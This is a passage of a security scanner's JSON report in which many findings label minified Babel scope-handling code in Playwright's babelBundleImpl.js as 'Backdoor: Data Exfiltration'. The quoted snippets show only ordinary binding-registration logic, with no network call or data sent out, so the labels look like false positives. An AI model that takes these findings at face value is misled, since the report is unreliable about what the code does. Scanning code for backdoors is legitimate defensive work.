                    "text": "t(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclarati",
                    "rendered": {
                      "text": "t(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclarati",
                      "markdown": "`t(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.get(\"specifiers\");for(let s of n){let i=r||s.isImportSpecifier()&&(s.node.importKind===\"type\"||s.node.importKind===\"typeof\");this.registerBinding(i?\"unknown\":\"module\",s)}}else if(t.isExportDeclaration()){let r=t.get(\"declaration\");(r.isClassDeclaration()||r.isFunctionDeclaration()||r.isVariableDeclarati`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 35780,
                  "endLine": 12,
                  "endColumn": 35785,
                  "snippet": {
                    "text": "is.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.g",
                    "rendered": {
                      "text": "is.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.g",
                      "markdown": "`is.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node.importKind===\"type\"||t.node.importKind===\"typeof\",n=t.g`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 35724,
                  "endLine": 12,
                  "endColumn": 35729,
                  "snippet": {
                    "text": "ike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node",
                    "rendered": {
                      "text": "ike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node",
                      "markdown": "`ike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of r)this.registerBinding(n===\"using\"||n===\"await using\"?\"const\":n,s)}else if(t.isClassDeclaration()){if(t.node.declare)return;this.registerBinding(\"let\",t)}else if(t.isImportDeclaration()){let r=t.node`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 35525,
                  "endLine": 12,
                  "endColumn": 35530,
                  "snippet": {
                    "text": "e\")),qi(\"slice\")),qi(\"call\")),[t]);let s,i=[t];return r===!0?s=\"toConsumableArray\":typeof r==\"number\"?(i.push(VY(r)),s=\"slicedToArray\"):s=\"toArray\",n&&(i.unshift(this.hub.addHelper(s)),s=\"maybeArrayLike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of ",
                    "rendered": {
                      "text": "e\")),qi(\"slice\")),qi(\"call\")),[t]);let s,i=[t];return r===!0?s=\"toConsumableArray\":typeof r==\"number\"?(i.push(VY(r)),s=\"slicedToArray\"):s=\"toArray\",n&&(i.unshift(this.hub.addHelper(s)),s=\"maybeArrayLike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of ",
                      "markdown": "`e\")),qi(\"slice\")),qi(\"call\")),[t]);let s,i=[t];return r===!0?s=\"toConsumableArray\":typeof r==\"number\"?(i.push(VY(r)),s=\"slicedToArray\"):s=\"toArray\",n&&(i.unshift(this.hub.addHelper(s)),s=\"maybeArrayLike\"),ES(this.hub.addHelper(s),i)}hasLabel(t){return!!this.getLabel(t)}getLabel(t){return this.labels.get(t)}registerLabel(t){this.labels.set(t.node.label.name,t)}registerDeclaration(t){if(t.isLabeledStatement())this.registerLabel(t);else if(t.isFunctionDeclaration())this.registerBinding(\"hoisted\",t.get(\"id\"),t);else if(t.isVariableDeclaration()){let r=t.get(\"declarations\"),{kind:n}=t.node;for(let s of `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 32856,
                  "endLine": 12,
                  "endColumn": 32861,
                  "snippet": {
                    "text": "e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node:r}=t,n=gS.scope.get(r);if((n==null?void 0:n.path)===t)return n;gS.scope.set(r,this),this.uid=ZY++,this.block=r,this.path=t,this.labels=new Map,this.inited=!1}get parent(){var t;let r,n=this.path;do{let s=n.key===\"key\"||n.listKey===\"decorators\";n=n.parentPath,s&&n.isMethod()&&(n=n.parentPath),n&&n.isScope()&&(r=n)}while",
                    "rendered": {
                      "text": "e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node:r}=t,n=gS.scope.get(r);if((n==null?void 0:n.path)===t)return n;gS.scope.set(r,this),this.uid=ZY++,this.block=r,this.path=t,this.labels=new Map,this.inited=!1}get parent(){var t;let r,n=this.path;do{let s=n.key===\"key\"||n.listKey===\"decorators\";n=n.parentPath,s&&n.isMethod()&&(n=n.parentPath),n&&n.isScope()&&(r=n)}while",
                      "markdown": "`e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node:r}=t,n=gS.scope.get(r);if((n==null?void 0:n.path)===t)return n;gS.scope.set(r,this),this.uid=ZY++,this.block=r,this.path=t,this.labels=new Map,this.inited=!1}get parent(){var t;let r,n=this.path;do{let s=n.key===\"key\"||n.listKey===\"decorators\";n=n.parentPath,s&&n.isMethod()&&(n=n.parentPath),n&&n.isScope()&&(r=n)}while`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 32535,
                  "endLine": 12,
                  "endColumn": 32540,
                  "snippet": {
                    "text": "parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node",
                    "rendered": {
                      "text": "parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node",
                      "markdown": "`parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void 0,this.data=void 0,this.crawling=void 0;let{node`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 32486,
                  "endLine": 12,
                  "endColumn": 32491,
                  "snippet": {
                    "text": "let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void",
                    "rendered": {
                      "text": "let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void",
                      "markdown": "`let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,this.references=void 0,this.globals=void 0,this.uids=void`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 32432,
                  "endLine": 12,
                  "endColumn": 32437,
                  "snippet": {
                    "text": "sterDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,thi",
                    "rendered": {
                      "text": "sterDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,thi",
                      "markdown": "`sterDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.uid=void 0,this.path=void 0,this.block=void 0,this.labels=void 0,this.inited=void 0,this.bindings=void 0,thi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 32326,
                  "endLine": 12,
                  "endColumn": 32331,
                  "snippet": {
                    "text": "nstantViolations.push(e)},BlockScoped(e){let t=e.scope;if(t.path===e&&(t=t.parent),t.getBlockParent().registerDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.ui",
                    "rendered": {
                      "text": "nstantViolations.push(e)},BlockScoped(e){let t=e.scope;if(t.path===e&&(t=t.parent),t.getBlockParent().registerDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.ui",
                      "markdown": "`nstantViolations.push(e)},BlockScoped(e){let t=e.scope;if(t.path===e&&(t=t.parent),t.getBlockParent().registerDeclaration(e),e.isClassDeclaration()&&e.node.id){let s=e.node.id.name;e.scope.bindings[s]=e.scope.parent.getBinding(s)}},CatchClause(e){e.scope.registerBinding(\"let\",e)},Function(e){let t=e.get(\"params\");for(let r of t)e.scope.registerBinding(\"param\",r);e.isFunctionExpression()&&e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e.get(\"id\"),e)},ClassExpression(e){e.has(\"id\")&&!e.get(\"id\").node[bS]&&e.scope.registerBinding(\"local\",e)}},ZY=0,so=class e{constructor(t){this.ui`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 31318,
                  "endLine": 12,
                  "endColumn": 31323,
                  "snippet": {
                    "text": ".isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclaration(e){e.scope.getBlockParent().registerDeclaration(e)},ReferencedIdentifier(e,t){t.references.push(e)},ForXStatement(e,t){let r=e.get(\"left\");if(r.isPattern()||r.isIdentifier())t.constantViolations.push(e);else if(r.isVar()){let{scope:n}=e;(n.getFunctionParent()||n.getProgramParent()).registerBinding(\"var\",r)}},ExportDeclaration:{exit(e){let{node:t,scope:r}=e;if(wS(t))return;let n=t.declaration;if(CY(n)||DY(n)){let s=n.id;if(!s)re",
                    "rendered": {
                      "text": ".isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclaration(e){e.scope.getBlockParent().registerDeclaration(e)},ReferencedIdentifier(e,t){t.references.push(e)},ForXStatement(e,t){let r=e.get(\"left\");if(r.isPattern()||r.isIdentifier())t.constantViolations.push(e);else if(r.isVar()){let{scope:n}=e;(n.getFunctionParent()||n.getProgramParent()).registerBinding(\"var\",r)}},ExportDeclaration:{exit(e){let{node:t,scope:r}=e;if(wS(t))return;let n=t.declaration;if(CY(n)||DY(n)){let s=n.id;if(!s)re",
                      "markdown": "`.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclaration(e){e.scope.getBlockParent().registerDeclaration(e)},ReferencedIdentifier(e,t){t.references.push(e)},ForXStatement(e,t){let r=e.get(\"left\");if(r.isPattern()||r.isIdentifier())t.constantViolations.push(e);else if(r.isVar()){let{scope:n}=e;(n.getFunctionParent()||n.getProgramParent()).registerBinding(\"var\",r)}},ExportDeclaration:{exit(e){let{node:t,scope:r}=e;if(wS(t))return;let n=t.declaration;if(CY(n)||DY(n)){let s=n.id;if(!s)re`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 30884,
                  "endLine": 12,
                  "endColumn": 30889,
                  "snippet": {
                    "text": "e.property,t);break;case\"JSXElement\":St(e.openingElement,t);break;case\"JSXOpeningElement\":St(e.name,t);break;case\"JSXFragment\":St(e.openingFragment,t);break;case\"JSXOpeningFragment\":t.push(\"Fragment\");break;case\"JSXNamespacedName\":St(e.namespace,t),St(e.name,t);break}}var pu={ForStatement(e){let t=e.get(\"init\");if(t.isVar()){let{scope:r}=e;(r.getFunctionParent()||r.getProgramParent()).registerBinding(\"var\",t)}},Declaration(e){if(e.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclarati",
                    "rendered": {
                      "text": "e.property,t);break;case\"JSXElement\":St(e.openingElement,t);break;case\"JSXOpeningElement\":St(e.name,t);break;case\"JSXFragment\":St(e.openingFragment,t);break;case\"JSXOpeningFragment\":t.push(\"Fragment\");break;case\"JSXNamespacedName\":St(e.namespace,t),St(e.name,t);break}}var pu={ForStatement(e){let t=e.get(\"init\");if(t.isVar()){let{scope:r}=e;(r.getFunctionParent()||r.getProgramParent()).registerBinding(\"var\",t)}},Declaration(e){if(e.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclarati",
                      "markdown": "`e.property,t);break;case\"JSXElement\":St(e.openingElement,t);break;case\"JSXOpeningElement\":St(e.name,t);break;case\"JSXFragment\":St(e.openingFragment,t);break;case\"JSXOpeningFragment\":t.push(\"Fragment\");break;case\"JSXNamespacedName\":St(e.namespace,t),St(e.name,t);break}}var pu={ForStatement(e){let t=e.get(\"init\");if(t.isVar()){let{scope:r}=e;(r.getFunctionParent()||r.getProgramParent()).registerBinding(\"var\",t)}},Declaration(e){if(e.isBlockScoped()||e.isImportDeclaration()||e.isExportDeclaration())return;(e.scope.getFunctionParent()||e.scope.getProgramParent()).registerDeclaration(e)},ImportDeclarati`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 1768,
                  "endLine": 12,
                  "endColumn": 1773,
                  "snippet": {
                    "text": "Property(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{value:!0});uu.default=void 0;var lY=no()",
                    "rendered": {
